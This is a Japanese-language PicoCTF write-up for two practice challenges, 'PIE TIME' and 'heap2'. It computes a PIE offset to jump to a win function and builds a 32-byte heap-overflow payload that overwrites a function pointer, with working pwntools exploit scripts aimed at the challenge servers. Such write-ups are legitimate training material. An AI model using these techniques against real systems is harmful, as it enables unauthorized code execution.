## PicoCTF

### PIE TIME

プログラムを実行するとmain関数のアドレスが表示され、
プログラムは入力したアドレスの関数を実行することができる
win関数が存在し、ここに飛べばフラグを取得できる
→main関数とwin関数の差分を計算すれば良い

```
gef➤  b *main
Breakpoint 1 at 0x133d
gef➤  p(*main - *win)
$1 = 0x96
```

オフセットは0x96であることがわかった
つまり以下でフラグを取得できる

```
from pwn import *

#target = process("./vuln")
target = remote('rescued-float.picoctf.net',59172)

rec = target.recvline()
rec2 = rec.split(b': ')[1][:-1]

rec2_str = rec2.decode('utf-8')

value = int(rec2_str, 16)

result = value - 0x96
hex_result = hex(result)

print(hex_result)

#recv.split(b' : ')[1][:-1]
target.sendlineafter(b'Enter the address to jump to, ex => 0x12345:',hex_result)
target.interactive()
```

### heap2

・heapをA*32するとオーバーフローする  
・最終的にはwin関数を呼び出せばフラグを取得できる  
・4番を選択するとcheck_win関数を呼び出す  
  
check_win関数のソースコード

```
void check_win() { ((void (*)())*(int*)x)(); }
```

#### ((void (*)())*(int*)x)();について

x が指すアドレスに格納されている整数値を関数ポインタと見なし、その関数を「呼び出す」コードです。

つまり、**オーバーフローさせてxの値にwin関数を書き込んで上げればフラグを取得できる**

ソースコード
```
from pwn import *
import time

#target = process('./chall')
target = remote('mimas.picoctf.net',54745)
binf = ELF('./chall', checksec=False)

context.log_level = 'debug'

print(p64(binf.symbols['win']).hex())

payload = b'A'*32 + p64(binf.symbols['win'])
#payload = b'A'*32 + bytes.fromhex(p64(binf.symbols['win']).hex())
print(payload)

#time.sleep(1000)

target.sendlineafter(b'Enter your choice: ',b'2')

target.sendlineafter(b'Data for buffer:',payload)

target.sendlineafter(b'Enter your choice: ',b'4')
target.interactive()
```
